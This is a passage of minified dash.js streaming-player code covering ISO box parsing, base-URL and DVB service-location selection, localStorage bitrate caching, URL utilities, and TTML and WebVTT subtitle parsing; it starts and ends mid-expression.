Blob([fa.target.response.slice(qa.sampleList[0].offset,qa.sampleList[0].offset+qa.sampleList[0].size)],{type:"image/jpeg"}),fa=wa.URL.createObjectURL(fa),oa.push({start:la.mediaStartTime,end:la.mediaStartTime+la.duration,url:fa}),ha&&ha(fa)}}),!0}}))}}}):(ia.startNumber=na.startNumber,ia.segmentDuration=na.segmentDuration,ia.timescale=na.timescale,ia.templateUrl=(pa=aa.isRelative(na.media)?aa.resolve(na.media,F.resolve(na.path).url):na.media)?(0,t.replaceIDForTemplate)(pa,na.id):""),0<ia.tilesHor&&0<ia.tilesVert&&(ia.widthPerTile=ia.width/ia.tilesHor,ia.heightPerTile=ia.height/ia.tilesVert,ma.push(ia))}function G(){ma=[],B=-1,A=null}var N,w=this.context,h=D.adapter,F=D.baseURLController,P=D.streamInfo,O=D.timelineConverter,R=D.debug,Q=D.eventBus,ja=D.events,W=D.dashConstants,aa=(0,g.default)(w).getInstance(),ma=void 0,H=void 0,B=void 0,A=void 0,Y=void 0,Z=void 0;return N={initialize:I,getTracks:function(){return ma},reset:G,setTrackByIndex:function(na){ma&&0!==ma.length&&(na>=ma.length&&(na=ma.length-1),B=na)},getCurrentTrack:function(){return 0>B?null:ma[B]},getCurrentTrackIndex:function(){return B},getThumbnailRequestForTime:function(na){for(var T=void 0,pa=h.getVoRepresentations(A),ia=0;ia<pa.length;ia++)if(ma[B].id===pa[ia].id){T=pa[ia];break}return H.getSegmentRequestForTime(A,T,na)}},I(),N}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(61));da=v(u(47));var f=v(u(235)),g=v(u(220)),t=u(80),r=v(u(54)),x=v(u(206)),z=v(u(159)),J=v(u(57)),E=["http://dashif.org/thumbnail_tile","http://dashif.org/guidelines/thumbnail_tile"];M.THUMBNAILS_SCHEME_ID_URIS=E,m.__dashjs_factory_name="ThumbnailTracks",M.default=da.default.getClassFactory(m)},{108:108,159:159,206:206,220:220,235:235,47:47,54:54,57:57,61:61,80:80}],205:[function(u,da,M){function v(E){return E&&E.__esModule?E:{default:E}}function m(){function E(){G.reset()}var D,I=this.context,L=(0,l.default)(I).getInstance(),G=void 0,N=void 0,w=void 0,h=void 0;return D={chooseSelector:function(F){(0,J.checkParameterType)(F,"boolean"),h=F?w:N},select:function(F){if(F){var P=F.baseUrls,O=F.selectedIdx;return isNaN(O)?(O=h.select(P))?(F.selectedIdx=P.indexOf(O),O):(L.trigger(f.default.URL_RESOLUTION_FAILED,{error:new z.default(p.default.URL_RESOLUTION_FAILED_GENERIC_ERROR_CODE,p.default.URL_RESOLUTION_FAILED_GENERIC_ERROR_MESSAGE)}),void(h===N&&E())):P[O]}},reset:E,setConfig:function(F){F.selector&&(h=F.selector)}},G=(0,g.default)(I).create({updateEventName:f.default.SERVICE_LOCATION_BLACKLIST_CHANGED,addBlacklistEventName:f.default.SERVICE_LOCATION_BLACKLIST_ADD}),N=(0,r.default)(I).create({blacklistController:G}),w=(0,t.default)(I).create({blacklistController:G}),h=N,D}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(51)),l=v(u(46)),f=v(u(54)),g=v(u(113)),t=v(u(223)),r=v(u(222)),x=v(u(47)),z=v(u(225)),J=u(218);m.__dashjs_factory_name="BaseURLSelector",M.default=x.default.getClassFactory(m),da.exports=M.default},{113:113,218:218,222:222,223:223,225:225,46:46,47:47,51:51,54:54}],206:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(){function r(E){if(!E)return null;void 0===E.fileStart&&(E.fileStart=0),E=g.default.parseBuffer(E);var D=(0,l.default)(J).create();return D.setData(E),D}var z,x=void 0,J=this.context;return z={parse:r,findLastTopIsoBoxCompleted:function(E,D,I){if(void 0===I&&(I=0),!D||I+8>=D.byteLength)return new t.default(0,!1);var L,G,N,w;D=D instanceof ArrayBuffer?new Uint8Array(D):D;for(var h=void 0,F=0;I<D.byteLength;){var P=(N=D)[(w=I)+3]>>>0|N[w+2]<<8>>>0|N[w+1]<<16>>>0|N[w]<<24>>>0,O=(L=D,G=I+4,String.fromCharCode(L[G++])+String.fromCharCode(L[G++])+String.fromCharCode(L[G++])+String.fromCharCode(L[G]));if(0==P)break;I+P<=D.byteLength&&(0<=E.indexOf(O)?h=new t.default(I,!0,P):F=I+P),I+=P}return h||new t.default(F,!1)},getMediaTimescaleFromMoov:function(E){return(E=(E=r(E))?E.getBox("mdhd"):void 0)?E.timescale:NaN},getSamplesInfo:function(E){if(!E||0===E.byteLength)return{sampleList:[],lastSequenceNumber:NaN,totalDuration:NaN,numSequences:NaN};var D=r(E);E=D.getBoxes("moof");var G,N,w,h,F,I=D.getBoxes("mfhd"),L=void 0,P=void 0;D=D.getBoxes("moof").length;var O=I[I.length-1].sequence_number;I=[];var R=-1,Q=-1;for(h=0;h<E.length;h++){var ja=E[h],W=ja.getChildBoxes("traf");for(N=0;N<W.length;N++){var aa=W[N],ma=aa.getChildBox("tfhd"),H=aa.getChildBox("tfdt");P=H.baseMediaDecodeTime;var B=aa.getChildBoxes("trun"),A=aa.getChildBoxes("subs");for(w=0;w<B.length;w++){var Y=B[w],Z=Y.sample_count,na=(ma.base_data_offset||0)+(Y.data_offset||0);for(G=0;G<Z;G++){aa=void 0!==(L=Y.samples[G]).sample_duration?L.sample_duration:ma.default_sample_duration;var T=void 0!==L.sample_size?L.sample_size:ma.default_sample_size,pa={dts:P,cts:P+(void 0!==L.sample_composition_time_offset?L.sample_composition_time_offset:0),duration:aa,offset:ja.offset+na,size:T,subSizes:[T]};if(A)for(F=0;F<A.length;F++){var ia=A[F];if(R<ia.entry_count-1&&Q<G&&(R++,Q+=ia.entries[R].sample_delta),G==Q){pa.subSizes=[];var S=ia.entries[R];for(ia=0;ia<S.subsample_count;ia++)pa.subSizes.push(S.subsamples[ia].subsample_size)}}I.push(pa),na+=T,P+=aa}}P-=H.baseMediaDecodeTime}}return{sampleList:I,lastSequenceNumber:O,totalDuration:P,numSequences:D}},findInitRange:function(E){var D=null,I=r(E);return I?(E=I.getBox("ftyp"),I=I.getBox("moov"),x.debug("Searching for initialization."),I&&I.isComplete&&(D=(E?E.offset:I.offset)+"-"+(I.offset+I.size-1),x.debug("Found the initialization.  Range: "+D)),D):D}},x=(0,p.default)(J).getInstance().getLogger(z),z}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(45)),l=v(u(214)),f=v(u(47)),g=v(u(9)),t=v(u(230));m.__dashjs_factory_name="BoxParser",M.default=f.default.getSingletonFactory(m),da.exports=M.default},{214:214,230:230,45:45,47:47,9:9}],207:[function(u,da,M){function v(){var p,l=void 0;return l=!(p={supportsMediaSource:function(){return"WebKitMediaSource"in wa||"MediaSource"in wa},supportsEncryptedMedia:function(){return l},supportsCodec:function(f){return!(!("MediaSource"in wa)||!MediaSource.isTypeSupported(f))||!(!("WebKitMediaSource"in wa)||!WebKitMediaSource.isTypeSupported(f))},setEncryptedMediaSupported:function(f){l=f}}),p}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="Capabilities",M.default=u.default.getSingletonFactory(v),da.exports=M.default},{47:47}],208:[function(u,da,M){function v(){return{customTimeRangeArray:[],length:0,add:function(f,g){var t;for(t=0;t<this.customTimeRangeArray.length&&f>this.customTimeRangeArray[t].start;t++);for(this.customTimeRangeArray.splice(t,0,{start:f,end:g}),t=0;t<this.customTimeRangeArray.length-1;t++)this.mergeRanges(t,t+1)&&t--;this.length=this.customTimeRangeArray.length},clear:function(){this.customTimeRangeArray=[],this.length=0},remove:function(f,g){for(var t=0;t<this.customTimeRangeArray.length;t++)if(f<=this.customTimeRangeArray[t].start&&g>=this.customTimeRangeArray[t].end)this.customTimeRangeArray.splice(t,1),t--;else{if(f>this.customTimeRangeArray[t].start&&g<this.customTimeRangeArray[t].end){this.customTimeRangeArray.splice(t+1,0,{start:g,end:this.customTimeRangeArray[t].end}),this.customTimeRangeArray[t].end=f;break}f>this.customTimeRangeArray[t].start&&f<this.customTimeRangeArray[t].end?this.customTimeRangeArray[t].end=f:g>this.customTimeRangeArray[t].start&&g<this.customTimeRangeArray[t].end&&(this.customTimeRangeArray[t].start=g)}this.length=this.customTimeRangeArray.length},mergeRanges:function(f,g){var t=this.customTimeRangeArray[f],r=this.customTimeRangeArray[g];return t.start<=r.start&&r.start<=t.end&&t.end<=r.end?(t.end=r.end,this.customTimeRangeArray.splice(g,1),!0):r.start<=t.start&&t.start<=r.end&&r.end<=t.end?(t.start=r.start,this.customTimeRangeArray.splice(g,1),!0):r.start<=t.start&&t.start<=r.end&&t.end<=r.end?(this.customTimeRangeArray.splice(f,1),!0):t.start<=r.start&&r.start<=t.end&&r.end<=t.end&&(this.customTimeRangeArray.splice(g,1),!0)},start:function(f){return(0,l.checkInteger)(f),f>=this.customTimeRangeArray.length||0>f?NaN:this.customTimeRangeArray[f].start},end:function(f){return(0,l.checkInteger)(f),f>=this.customTimeRangeArray.length||0>f?NaN:this.customTimeRangeArray[f].end}}}Object.defineProperty(M,"__esModule",{value:!0});var m,p=(m=u(47))&&m.__esModule?m:{default:m},l=u(218);v.__dashjs_factory_name="CustomTimeRanges",M.default=p.default.getClassFactory(v),da.exports=M.default},{218:218,47:47}],209:[function(u,da,M){function v(t){return t&&t.__esModule?t:{default:t}}function m(t){function r(L){if(void 0!==I)return I;I=!1;var G=void 0;try{void 0!==wa&&(G=wa[L])}catch(N){return D.warn("DOMStorage access denied: "+N.message),I}if(!G||"localStorage"!==L&&"sessionStorage"!==L)return I;try{G.setItem("1","1"),G.removeItem("1"),I=!0}catch(N){D.warn("DOMStorage is supported, but cannot be used: "+N.message)}return I}function x(L,G){return r(L)&&E.get().streaming[G+"CachingInfo"].enabled}function z(){if(!E)throw Error(f.default.MISSING_CONFIG_ERROR)}t=t||{};var J=this.context,E=t.settings,D=t=void 0,I=void 0;return t={getSavedBitrateSettings:function(L){var G=NaN;if(z(),x("localStorage","lastBitrate")){var N="dashjs_?_bitrate".replace(/\?/,L);try{var w=JSON.parse(localStorage.getItem(N))||{},h=(new Date).getTime()-parseInt(w.timestamp,10)>=E.get().streaming.lastBitrateCachingInfo.ttl||!1,F=parseFloat(w.bitrate);isNaN(F)||h?h&&localStorage.removeItem(N):(G=F,D.debug("Last saved bitrate for "+L+" was "+F))}catch(P){return null}}return G},setSavedBitrateSettings:function(L,G){if(x("localStorage","lastBitrate")&&G){L="dashjs_?_bitrate".replace(/\?/,L);try{localStorage.setItem(L,JSON.stringify({bitrate:G.toFixed(3),timestamp:6e5*Math.round((new Date).getTime()/6e5)}))}catch(N){D.error(N.message)}}},getSavedMediaSettings:function(L){var G=null;if(z(),x("localStorage","lastMediaSettings")){L="dashjs_?_settings".replace(/\?/,L);try{var N=JSON.parse(localStorage.getItem(L))||{},w=(new Date).getTime()-parseInt(N.timestamp,10)>=E.get().streaming.lastMediaSettingsCachingInfo.ttl||!1;G=N.settings,w&&(localStorage.removeItem(L),G=null)}catch(h){return null}}return G},setSavedMediaSettings:function(L,G){if(x("localStorage","lastMediaSettings")){L="dashjs_?_settings".replace(/\?/,L);try{localStorage.setItem(L,JSON.stringify({settings:G,timestamp:6e5*Math.round((new Date).getTime()/6e5)}))}catch(N){D.error(N.message)}}}},D=(0,l.default)(J).getInstance().getLogger(t),r("localStorage")&&g.forEach((function(L){var G=localStorage.getItem(L.oldKey);if(G){localStorage.removeItem(L.oldKey);try{localStorage.setItem(L.newKey,G)}catch(N){D.error(N.message)}}})),t}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(45)),f=v(u(108)),g=[{oldKey:"dashjs_vbitrate",newKey:"dashjs_video_bitrate"},{oldKey:"dashjs_abitrate",newKey:"dashjs_audio_bitrate"},{oldKey:"dashjs_vsettings",newKey:"dashjs_video_settings"},{oldKey:"dashjs_asettings",newKey:"dashjs_audio_settings"}];m.__dashjs_factory_name="DOMStorage",u=p.default.getSingletonFactory(m),M.default=u,da.exports=M.default},{108:108,45:45,47:47}],210:[function(u,da,M){function v(){function f(G){var N=G.indexOf("/"),w=G.lastIndexOf("/");return-1!==N?w===N+1?G:(-1!==G.indexOf("?")&&(G=G.substring(0,G.indexOf("?"))),G.substring(0,w+1)):""}function g(G){return(G=G.match(L))?G[1]:""}function t(G){return(G=G.match(E))?G[0]:""}function r(G){return!E.test(G)}function x(G){return r(G)&&"/"===G.charAt(0)}function z(G){return 0===G.indexOf("//")}var J=void 0,E=/^[a-z][a-z0-9+\-_.]*:/i,D=/^https?:\/\//i,I=/^https:\/\//i,L=/^([a-z][a-z0-9+\-_.]*:\/\/[^\/]+)\/?/i;try{new wa.URL("x","http://y"),J=function p(G,N){try{return new wa.URL(G,N).toString()}catch(w){return G}}}catch(G){}finally{J=J||function l(G,N){var w=f;return N&&r(G)?(x(G)&&(w=g),z(G)&&(w=t),N=w(N),w="/"!==N.charAt(N.length-1)&&"/"!==G.charAt(0)?"/":"",[N,G].join(w)):G}}return{parseBaseUrl:f,parseOrigin:g,parseScheme:t,isRelative:r,isPathAbsolute:x,isSchemeRelative:z,isHTTPURL:function(G){return D.test(G)},isHTTPS:function(G){return I.test(G)},removeHostname:function(G){return/^(?:\w+:\/\/)?([^\/]+)(.*)$/.exec(G)[2].substring(1)},resolve:function(G,N){return J(G,N)}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="DefaultURLUtils",M.default=u.default.getSingletonFactory(v),da.exports=M.default},{47:47}],211:[function(u,da,M){function v(p){function l(x,z){var E,J=!0;if(void 0===z&&(z=!1),E=16777215<x.tag?(t.getUint32(r)!==x.tag&&(J=!1),4):65535<x.tag?(256*t.getUint16(r)+t.getUint8(r+2)!==x.tag&&(J=!1),3):255<x.tag?(t.getUint16(r)!==x.tag&&(J=!1),2):(t.getUint8(r)!==x.tag&&(J=!1),1),!J&&x.required&&!z)throw Error("required tag not found");return J&&(r+=E),J}function f(x){var L,z=1,J=128,E=-1,D=0,I=t.getUint8(r);for(L=0;8>L;L+=1){if((I&J)===J){D=void 0===x?I&~J:I,E=L;break}J>>=1}for(L=0;L<E;L+=1,z+=1)D=D<<8|255&t.getUint8(r+z);return r+=z,D}p=p||{};var g=void 0,t=new DataView(p.data),r=0;return g={getPos:function(){return r},setPos:function(x){r=x},consumeTag:l,consumeTagAndSize:function(x,z){return(x=l(x,z))&&f(),x},parseTag:function(x){var z;return l(x),z=f(),g[x.parse](z)},skipOverElement:function(x,z){return x=l(x,z),z=void 0,x&&(z=f(),r+=z),x},getMatroskaCodedNum:f,getMatroskaFloat:function(x){var z=void 0;switch(x){case 4:z=t.getFloat32(r),r+=4;break;case 8:z=t.getFloat64(r),r+=8}return z},getMatroskaUint:function(x){for(var z=0,J=0;J<x;J+=1)z<<=8,z|=255&t.getUint8(r+J);return r+=x,z},moreData:function(){return r<t.byteLength}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="EBMLParser",M.default=u.default.getClassFactory(v),da.exports=M.default},{47:47}],212:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){var f=this.context,g=(0,p.default)(f).getInstance();return{error:function(t){g.trigger(l.default.ERROR,{error:t})}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(46)),l=v(u(54));u=v(u(47)),m.__dashjs_factory_name="ErrorHandler",M.default=u.default.getSingletonFactory(m),da.exports=M.default},{46:46,47:47,54:54}],213:[function(u,da,M){function v(){var p={};return{save:function(l){var f=l.streamId,g=l.representationId;p[f]=p[f]||{},p[f][g]=l},extract:function(l,f){return p&&p[l]&&p[l][f]?p[l][f]:null},reset:function(){p={}}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="InitCache",M.default=u.default.getSingletonFactory(v),da.exports=M.default},{47:47}],214:[function(u,da,M){function v(l){return l&&l.__esModule?l:{default:l}}function m(){function l(t){var r=[];if(!t||!g||"function"!=typeof g.fetchAll)return r;for(var x=void 0,z=0,J=(t=g.fetchAll(t)).length;z<J;z++)(x=f(t[z]))&&r.push(x);return r}function f(t){if(!t)return null;var r=new p.default(t);return t.hasOwnProperty("_incomplete")&&(r.isComplete=!t._incomplete),r}var g=void 0;return{getBox:function(t){return t&&g&&g.boxes&&0!==g.boxes.length&&"function"==typeof g.fetch?f(g.fetch(t)):null},getBoxes:l,setData:function(t){g=t},getLastBox:function(){if(!g||!g.boxes||!g.boxes.length)return null;var t=l(g.boxes[g.boxes.length-1].type);return 0<t.length?t[t.length-1]:null}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(229));u=v(u(47)),m.__dashjs_factory_name="IsoFile",M.default=u.default.getClassFactory(m),da.exports=M.default},{229:229,47:47}],215:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){var g=(f=f||{}).timelineConverter;return{getLiveEdge:function(t){if(!g||!g.hasOwnProperty("getExpectedLiveEdge"))throw Error(l.default.MISSING_CONFIG_ERROR);var r=t.DVRWindow?t.DVRWindow.end:0,x=r;return t.useCalculatedLiveEdgeTime&&(x=g.getExpectedLiveEdge(),g.setClientTimeOffset(x-r)),x},reset:function(){g=null}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(108));m.__dashjs_factory_name="LiveEdgeFinder",M.default=p.default.getClassFactory(m),da.exports=M.default},{108:108,47:47}],216:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){return{areEqual:function(f,g){return(0,l.default)(f,g)}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(12));m.__dashjs_factory_name="ObjectUtils",M.default=p.default.getSingletonFactory(m),da.exports=M.default},{12:12,47:47}],217:[function(u,da,M){function v(){return{modifyRequestURL:function(p){return p},modifyRequestHeader:function(p){return p}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="RequestModifier",M.default=u.default.getSingletonFactory(v),da.exports=M.default},{47:47}],218:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.checkParameterType=function(p,l){if(typeof p!==l)throw m.default.BAD_ARGUMENT_ERROR},M.checkInteger=function(p){if(null===p||isNaN(p)||0!=p%1)throw m.default.BAD_ARGUMENT_ERROR+" : argument is not an integer"},M.checkRange=function(p,l,f){if(p<l||f<p)throw m.default.BAD_ARGUMENT_ERROR+" : argument out of range"},M.checkIsVideoOrAudioType=function(p){if("string"!=typeof p||p!==m.default.AUDIO&&p!==m.default.VIDEO)throw m.default.BAD_ARGUMENT_ERROR};var v,m=(v=u(108))&&v.__esModule?v:{default:v}},{108:108}],219:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(){var z,r=this.context,x=(0,f.default)(r).getInstance(),J=void 0,E=0;return z={parse:function(D,I,L,G,N){var w="",h=[],F=void 0,P=void 0,O=void 0;O={};var R={},Q="",ja="";if(!D)throw w="no ttml data to parse",Error(w);O.data=D,x.trigger(g.default.TTML_TO_PARSE,O),D=(0,t.fromXML)(O.data,(function(H){w=H}),{onOpenTag:function(H,B,A){if("image"===B&&"http://www.smpte-ra.org/schemas/2052-1/2010/smpte-tt"===H){if(!A[" imagetype"]||"PNG"!==A[" imagetype"].value)return void J.warn("smpte-tt imagetype != PNG. Discarded");Q=A["http://www.w3.org/XML/1998/namespace id"].value}},onCloseTag:function(){Q&&(R[Q]=ja.trim()),Q=ja=""},onText:function(H){Q&&(ja+=H)}}),x.trigger(g.default.TTML_PARSED,{ttmlString:O.data,ttmlDoc:D});var W,aa=D.getMediaTimeEvents();for(O=0;O<aa.length;O++){var ma=(0,t.generateISD)(D,aa[O],(function(H){w=H}));ma.contents.some((function(H){return H.contents.length}))&&(F=aa[O]+I<L?L:aa[O]+I)<(P=aa[O+1]+I>G?G:aa[O+1]+I)&&h.push({start:F,end:P,type:"html",cueID:(W="cue_TTML_"+E,E++,W),isd:ma,images:N,embeddedImages:R})}if(""!==w)throw J.error(w),Error(w);return h}},J=(0,l.default)(r).getInstance().getLogger(z),z}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(45)),f=v(u(46)),g=v(u(54)),t=u(17);m.__dashjs_factory_name="TTMLParser",M.default=p.default.getSingletonFactory(m),da.exports=M.default},{17:17,45:45,46:46,47:47,54:54}],220:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){function f(x,z,J){a:{var D,E=J||z;for(D=0;D<t.length;D++)if(t[D].regex.test(E)){E=t[D].utils;break a}E=g}return E&&"function"==typeof E[x]?E[x](z,J):g[x](z,J)}var g=void 0,t=[],r=this.context;return g=(0,l.default)(r).getInstance(),{registerUrlRegex:function(x,z){t.push({regex:x,utils:z})},parseBaseUrl:function(x){return f("parseBaseUrl",x)},parseOrigin:function(x){return f("parseOrigin",x)},parseScheme:function(x){return f("parseScheme",x)},isRelative:function(x){return f("isRelative",x)},isPathAbsolute:function(x){return f("isPathAbsolute",x)},isSchemeRelative:function(x){return f("isSchemeRelative",x)},isHTTPURL:function(x){return f("isHTTPURL",x)},isHTTPS:function(x){return f("isHTTPS",x)},removeHostname:function(x){return f("removeHostname",x)},resolve:function(x,z){return f("resolve",x,z)}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(210));m.__dashjs_factory_name="URLUtils",u=p.default.getSingletonFactory(m),M.default=u,da.exports=M.default},{210:210,47:47}],221:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){function f(D){var I=D.split(":"),L=I.length-1;return D=60*parseInt(I[L-1],10)+parseFloat(I[L]),2==L&&(D+=3600*parseInt(I[0],10)),D}var t,g=this.context,r=void 0,x=void 0,z=void 0,J=void 0,E=void 0;return t={parse:function(D){var I=[],L=void 0;if(!D)return I;var G=(D=D.split(x)).length;L=-1;for(var N,w,h=0;h<G;h++){var F,P,O,R,Q,ja,W=D[h];0<W.length&&"WEBVTT"!==W&&W.match(z)&&(w=N=void 0,(w=(N=W.split(z))[1].split(E)).shift(),N[1]=w[0],w.shift(),P=(F={cuePoints:N,styles:function(aa){var ma={};return aa.forEach((function(H){var B;1<H.split(/:/).length&&((B=H.split(/:/)[1])&&-1!=B.search(/%/)&&(B=parseInt(B.replace(/%/,""),10)),(H.match(/align/)||H.match(/A/))&&(ma.align=B),(H.match(/line/)||H.match(/L/))&&(ma.line=B),(H.match(/position/)||H.match(/P/))&&(ma.position=B),(H.match(/size/)||H.match(/S/))&&(ma.size=B))})),ma}(w)}).cuePoints,O=F.styles,R=function(aa,ma){for(var H=ma,B="",A="";""!==aa[H]&&H<aa.length;)H++;if(1<(H-=ma))for(var Y=0;Y<H;Y++){if((A=aa[ma+Y]).match(z)){B="";break}B+=A,Y!==H-1&&(B+="\n")}else(A=aa[ma]).match(z)||(B=A);return B}(D,h+1),Q=f(P[0].replace(J,"")),ja=f(P[1].replace(J,"")),!isNaN(Q)&&!isNaN(ja)&&L<=Q&&Q<ja?""!==R?(L=Q,I.push({start:Q,end:ja,data:R,styles:O})):r.error("Skipping cue due to empty/malformed cue text"):r.error("Skipping cue due to incorrect cue timing"))}return I}},r=(0,l.default)(g).getInstance().getLogger(t),x=/(?:\r\n|\r|\n)/gm,z=/--\x3e/,J=/(^[\s]+|[\s]+$)/g,E=/\s\b/g,t}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(45));m.__dashjs_factory_name="VTTParser",M.default=p.default.getSingletonFactory(m),da.exports=M.default},{45:45,47:47}],222:[function(u,da,M){function v(p){var l=(p=p||{}).blacklistController;return{select:function(f){var g=0,t=void 0;return f&&f.some((function(r,x){return g=x,!l.contains(r.serviceLocation)}))&&(t=f[g]),t}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="BasicSelector",M.default=u.default.getClassFactory(v),da.exports=M.default},{47:47}],223:[function(u,da,M){function v(p){var l=(p=p||{}).blacklistController;return{select:function(f){return f&&function(t){var r=0,x=[],z=0,J=void 0,E=void 0;if((E=t.sort((function(D,I){return D=D.dvb_priority-I.dvb_priority,isNaN(D)?0:D})).filter((function(D,I,L){return!I||L[0].dvb_priority&&D.dvb_priority&&L[0].dvb_priority===D.dvb_priority}))).length)return 1<E.length&&(E.forEach((function(D){r+=D.dvb_weight,x.push(r)})),J=Math.floor(Math.random()*(r-1)),x.every((function(D,I){return z=I,!(J<D)}))),E[z]}((g=[],f.filter((function(t){return!l.contains(t.serviceLocation)||(t.dvb_priority&&g.push(t.dvb_priority),!1)})).filter((function(t){return!g.length||!t.dvb_priority||-1===g.indexOf(t.dvb_priority)}))));var g}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="DVBSelector",M.default=u.default.getClassFactory(v),da.exports=M.default},{47:47}],224:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.scanType=this.height=this.width=this.bitrate=this.mediaType=null,this.qualityIndex=NaN},da.exports=M.default},{}],225:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function f(m,p,l){if(!(this instanceof f))throw new TypeError("Cannot call a class as a function");this.code=m||null,this.message=p||null,this.data=l||null},da.exports=M.default},{}],226:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.segmentType=this.mediaInfo=this.streamId=null,this.index=this.quality=NaN,this.bytes=null,this.duration=this.end=this.start=NaN,this.endFragment=this.representationId=null},da.exports=M.default},{}],227:[function(u,da,M){function v(l,f){for(var g=0;g<f.length;g++){var t=f[g];t.enumerable=t.enumerable||!1,t.configurable=!0,"value"in t&&(t.writable=!0),Object.defineProperty(l,t.key,t)}}function m(l){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.action=m.ACTION_DOWNLOAD,this.startTime=NaN,this.type=this.mediaInfo=this.mediaType=null,this.timescale=this.duration=NaN,this.range=null,this.url=l||null,this.requestEndDate=this.firstByteDate=this.requestStartDate=this.serviceLocation=null,this.index=this.quality=NaN,this.wallStartTime=this.availabilityEndTime=this.availabilityStartTime=null,this.delayLoadingTime=this.bytesTotal=this.bytesLoaded=NaN,this.responseType="arraybuffer",this.representationId=null}Object.defineProperty(M,"__esModule",{value:!0});var l,f,p=u(241);l=m,f=[{key:"isInitializationRequest",value:function(){return this.type&&this.type===p.HTTPRequest.INIT_SEGMENT_TYPE}},{key:"setInfo",value:function(l){this.type=l&&l.init?p.HTTPRequest.INIT_SEGMENT_TYPE:p.HTTPRequest.MEDIA_SEGMENT_TYPE,this.url=l&&l.url?l.url:null,this.range=l&&l.range?l.range.start+"-"+l.range.end:null,this.mediaType=l&&l.mediaType?l.mediaType:null}}],f&&v(l.prototype,f),(u=m).ACTION_DOWNLOAD="download",u.ACTION_COMPLETE="complete",M.default=u,da.exports=M.default},{241:241}],228:[function(u,da,M){function v(m){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");a:{for(var p=Object.getPrototypeOf(v.prototype),l="constructor",f=this,g=!0;g;){if(null===p&&(p=Function.prototype),void 0!==(g=Object.getOwnPropertyDescriptor(p,l))){if("value"in g){f=g.value;break a}if(void 0===(l=g.get))break;f=l.call(f);break a}if(null===(p=Object.getPrototypeOf(p)))break;g=!0}f=void 0}f.call(this,m),this.checkForExistenceOnly=!0}Object.defineProperty(M,"__esModule",{value:!0}),function(m,p){if("function"!=typeof p&&null!==p)throw new TypeError("Super expression must either be null or a function, not "+typeof p);m.prototype=Object.create(p&&p.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),p&&(Object.setPrototypeOf?Object.setPrototypeOf(m,p):m.__proto__=p)}(v,((u=u(227))&&u.__esModule?u:{default:u}).default),u=v,M.default=u,da.exports=M.default},{227:227}],229:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(p){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");if(this.offset=p._offset,this.type=p.type,this.size=p.size,this.boxes=[],p.boxes)for(var l=0;l<p.boxes.length;l++)this.boxes.push(new m(p.boxes[l]));switch(this.isComplete=!0,p.type){case"sidx":if(this.timescale=p.timescale,this.earliest_presentation_time=p.earliest_presentation_time,this.first_offset=p.first_offset,this.references=p.references,p.references)for(this.references=[],l=0;l<p.references.length;l++)this.references.push({reference_type:p.references[l].reference_type,referenced_size:p.references[l].referenced_size,subsegment_duration:p.references[l].subsegment_duration});break;case"emsg":this.id=p.id,this.value=p.value,this.timescale=p.timescale,this.scheme_id_uri=p.scheme_id_uri,this.presentation_time_delta=1===p.version?p.presentation_time:p.presentation_time_delta,this.event_duration=p.event_duration,this.message_data=p.message_data;break;case"mdhd":this.timescale=p.timescale;break;case"mfhd":this.sequence_number=p.sequence_number;break;case"subs":this.entry_count=p.entry_count,this.entries=p.entries;break;case"tfhd":this.base_data_offset=p.base_data_offset,this.sample_description_index=p.sample_description_index,this.default_sample_duration=p.default_sample_duration,this.default_sample_size=p.default_sample_size,this.default_sample_flags=p.default_sample_flags,this.flags=p.flags;break;case"tfdt":this.version=p.version,this.baseMediaDecodeTime=p.baseMediaDecodeTime,this.flags=p.flags;break;case"trun":if(this.sample_count=p.sample_count,this.first_sample_flags=p.first_sample_flags,this.data_offset=p.data_offset,this.flags=